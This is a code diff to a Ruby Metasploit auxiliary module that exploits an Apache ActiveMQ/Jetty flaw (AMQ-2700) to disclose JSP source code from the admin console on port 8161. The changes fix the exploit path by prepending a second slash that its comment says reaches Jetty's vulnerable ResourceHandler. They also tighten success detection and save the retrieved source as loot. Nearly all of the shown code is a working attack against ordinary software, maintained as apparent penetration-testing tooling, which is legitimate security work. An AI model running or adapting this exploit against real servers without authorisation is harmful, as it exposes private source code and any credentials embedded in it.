@@ -30,31 +30,34 @@ class MetasploitModule < Msf::Auxiliary
           [ 'BID', '39636' ],
           [ 'URL', 'https://issues.apache.org/jira/browse/AMQ-2700' ]
         ],
+        'DefaultOptions' => { 'RPORT' => 8161 },
         'Notes' => {
-          'Reliability' => UNKNOWN_RELIABILITY,
-          'Stability' => UNKNOWN_STABILITY,
-          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+          'Reliability' => [],
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS]
         }
       )
     )
 
     register_options(
       [
-        Opt::RPORT(8161),
         OptString.new('TARGETURI', [true, 'Path to the JSP file to disclose source code', '/admin/index.jsp'])
       ]
     )
   end
 
   def run_host(ip)
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending request...")
-    uri = normalize_uri(target_uri.path)
+    print_status('Sending request...')
+    # Add the exploit's second slash after normalization, which removes repeated
+    # slashes. This routes the request through Jetty's vulnerable ResourceHandler.
+    uri = "/#{normalize_uri(target_uri.path)}"
     res = send_request_cgi({
       'uri' => uri,
-      'method' => 'GET',
+      'method' => 'GET'
     })
 
-    if res and res.code == 200
+    # A rendered JSP is also HTTP200; it must not be reported as disclosed source.
+    if res && res.code == 200 && res.body.to_s.include?('<%')
       contents = res.body
       fname = File.basename(datastore['TARGETURI'])
       path = store_loot(
@@ -64,9 +67,9 @@ class MetasploitModule < Msf::Auxiliary
         contents,
         fname
       )
-      print_status("#{Rex::Socket.to_authority(rhost, rport)} - File saved in: #{path}")
+      print_status("File saved in: #{path}")
     else
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to retrieve file")
+      print_error('Failed to retrieve JSP source')
       return
     end
   end
